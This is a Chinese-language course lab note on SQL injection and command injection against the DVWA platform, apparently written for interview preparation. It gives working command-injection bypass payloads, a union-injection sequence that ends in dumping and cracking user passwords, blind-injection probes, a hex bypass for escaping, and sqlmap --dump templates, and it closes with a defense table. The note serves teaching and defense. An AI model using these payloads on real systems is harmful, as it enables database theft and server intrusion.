# Web 注入攻击：SQL 注入与命令注入

> 来源：Web 工程与安全课程实验（DVWA 平台，2025-2026 第二学期）
> 定位：渗透测试核心中的核心，OWASP Top 1 漏洞，面试必问
> 实战场景：任何带数据库的 Web 应用（登录框、搜索框、参数传递处）

---

## 一、注入攻击是什么

**一句话原理**：程序把用户输入**直接拼进**了可执行语句（SQL 语句 / shell 命令），输入里的特殊字符改变了语句原本的逻辑，实现了"输入即代码"。

```
命令注入: system("ping " + 用户输入)   →  输入 ;ifconfig  →  执行了额外命令
SQL注入:  SELECT * FROM users WHERE id='用户输入'  →  输入 ' or 1=1#  →  查询逻辑被改写
```

**为什么危险**：注入能造成 信息泄露（脱库）、权限绕过（万能密码）、远程命令执行（RCE）、甚至提权拿到服务器。

---

## 二、命令注入（Command Injection）

### 原理
Web 后端调用系统命令（如 ping、nslookup）时，未过滤就拼接用户输入。

### 核心绕过手法（DVWA 三级别，思路递进）

| 级别 | 过滤规则 | 绕过手法 | 示例 Payload |
|---|---|---|---|
| Low | 无过滤 | shell 元字符直接拼接 | `127.0.0.1;ifconfig`（分号连续执行） |
| Medium | 过滤 `&&` 和 `;` | 用**没被过滤**的 `&` 代替 | `127.0.0.1&ls -l`（后台执行） |
| High | 黑名单过滤大量符号，但**管道符 `|` 后面误加了空格**（`| `） | 利用过滤规则的疏漏，用 `|`（管道） | `127.0.0.1|ls` |

**命令拼接常用符号速记**：
- `;` 顺序执行 ／ `&&` 前面成功才执行 ／ `|` 管道传给下一条 ／ `||` 前面失败才执行 ／ `` `cmd` `` 与 `$(cmd)` 命令替换 ／ `&` 后台执行

### 审计要点（防御侧视角）
- 代码层：**永远不要**用 `system()` / `exec()` / `shell_exec()` 拼接用户输入；用白名单校验参数（如 IP 格式正则）
- 现实漏洞案例：路由器/摄像头 Web 管理页的 ping 测试、导出功能里拼系统命令

---

## 三、SQL 注入

### 类型判断（第一件事永远是这个）
```
输入 1         → 正常回显
输入 1'        → 报错 / 异常          （可能字符型注入）
输入 1 or 1=1  → 若返回全部数据 → 数字型；若只返回 id=1 的行 → 字符型
```
- 数字型：`WHERE id = 1 or 1=1` → 永真，返回所有
- 字符型：`WHERE id = '1 or 1=1'` → 等价于 `id='1'`，只返回一条

### 手工注入八步法（union 注入，重点背）
1. **判断注入点**：`1'` 报错，说明语句被破坏
2. **判断类型**：字符型 / 数字型（如上）
3. **猜字段数**：`1' order by N#`（N 递增，报错的那格就是列数上限）→ union 前后字段数必须一致
4. **猜数据库名**：`1' union select 1,database()#`
5. **猜表名**：`1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='dvwa'#`
6. **猜字段名**：`1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users'#`
7. **拖数据**：`1' union select user,password from users#`
8. **解密码**：MD5 等哈希 → 彩虹表 / cmd5 / 在线破解

### 关键知识点（面试常问，逐个搞懂）
- **`#`（MySQL 注释）**：截断后面的 `'` 和查询尾巴，让拼接语句合法
- **`union` 要求前后 SELECT 字段数一致** → 所以才要先 `order by` 猜列数
- **`information_schema`**：MySQL 自带"元数据库"，`TABLES` 存所有表名、`COLUMNS` 存所有字段名 —— 脱库的地图
- **`group_concat()`**：把多行结果拼成一行显示，解决"一个位置只能回显一个字段"的问题
- **回显位**：union 里 `select 1,database()#` 的 `1` 是占位（填充不回显的列），`database()` 放在**有回显的那一列**
- **SQL 注入 → GetShell 进阶**：`into outfile` 写一句话木马、`load_file()` 读文件、堆叠注入

### Medium 绕过（转义函数）
- `mysqli_real_escape_string()` 会把 `'` 转义成 `\'`，单引号字符串失效
- **绕过：把字符串转十六进制，不带引号**：`'dvwa'` → `0x64767761`（dvwa 的 hex）
- 通用思路：**一切过滤都是"这个符号被处理了，那就用不含这个符号的写法表达同样的意思"**

### High 绕过（双页面架构）
- 输入页与回显页分离（session 传值），注入点报错后主页面会一直卡在错误状态 → **删 Cookie / 清 session 重来**
- 本质还是字符型注入，八步法照走：`2' or 1=1 order by 1#`

### 盲注（Blind SQL Injection）
**场景**：页面不回显数据，只有"存在/不存在"两种反馈（`User ID exists in the database.`）

**手工盲注方法论（length → substr → ascii 二分猜）**：
1. **猜库名长度**：`1' and length(database())=N#`（N 从 1 递增，返回"存在"即命中）
2. **猜每一位字符**：`1' and ascii(substr(database(),1,1))>N#`（不断二分逼近，看 ASCII 表还原字符）
3. 表名/字段名/数据 同理，叠加子查询 + limit：
   - 表数量：`1' and (select count(table_name) from information_schema.tables where table_schema='dvwa')=2#`
   - 第 N 张表长度：`1' and length(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1))=9#`
   - 第 N 张表第 M 个字符：`1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1,1))>100#`

> 盲注核心思想：**把"数据库内容"变成"一个个布尔判断题"**，一次问一个字符，自动化脚本就是干这个的。

---

## 四、sqlmap 自动化（面试/实战必会）

### 基础命令模板
```bash
# GET 注入，枚举库
python sqlmap.py -u "http://target/vuln.php?id=1" --cookie "PHPSESSID=xxx; security=low" --dbs --batch

# 指定库 → 表 → 字段 → 数据（一条龙）
python sqlmap.py -u "http://target/vuln.php?id=1" --cookie "PHPSESSID=xxx" -D dvwa -T users --dump --batch
```

### 按场景选参数
| 场景 | 参数 |
|---|---|
| POST 注入（参数在请求体） | `--data "id=1&Submit=Submit" --method POST` |
| 需要登录态 | `--cookie "..."` |
| 双页面（输入页≠回显页） | `--second-url "http://target/回显页"` |
| 过滤转义函数 | `--tamper`（如 `space2comment` 等绕过脚本） |
| 指定列 | `-C user,password` |
| 清缓存重试 | `--flush-session` |

### 实战要点
- 先 `--batch` 免得交互卡死，cookie 拿对了再跑
- sqlmap 本质 = 自动化的"手工八步法"+"盲注判断"——**理解手工流程才能读懂 sqlmap 的输出**

---

## 五、防御（面试必答，对应原理说）

| 攻击点 | 防御 |
|---|---|
| SQL 拼接 | **参数化查询 / 预处理语句**（PDO prepare + bindParam），永远不用字符串拼 SQL |
| 特殊字符 | 输入校验白名单 + 转义（转义只是缓解，不是根治） |
| 数据库权限 | 最小权限原则：Web 账号不连 root，禁 `into outfile` / `load_file` |
| 错误信息 | 关闭详细的 SQL 报错回显（防报错注入+信息泄露） |
| 命令注入 | 禁用 `system()` 拼接、白名单校验、`escapeshellarg()` 兜底 |

---

## 六、面试速答卡

- **什么是 SQL 注入**：用户输入拼进 SQL 语句改变了原执行逻辑
- **union 注入条件**：回显位存在 + union 前后列数一致
- **怎么判断字符型/数字型**：`1 or 1=1` 看返回（字符型只回一行）
- **order by 干嘛的**：猜列数，配合 union
- **盲注三件套**：`length()` 猜长度、`substr()` 取位、`ascii()` 转数值二分
- **绕过转义**：十六进制代替字符串引号（`0x64767761`）
- **sqlmap 一条龙**：`--dbs` → `-D 库 --tables` → `-T 表 --columns` → `--dump`
- **最有效防御**：参数化查询，输入永远当数据不当代码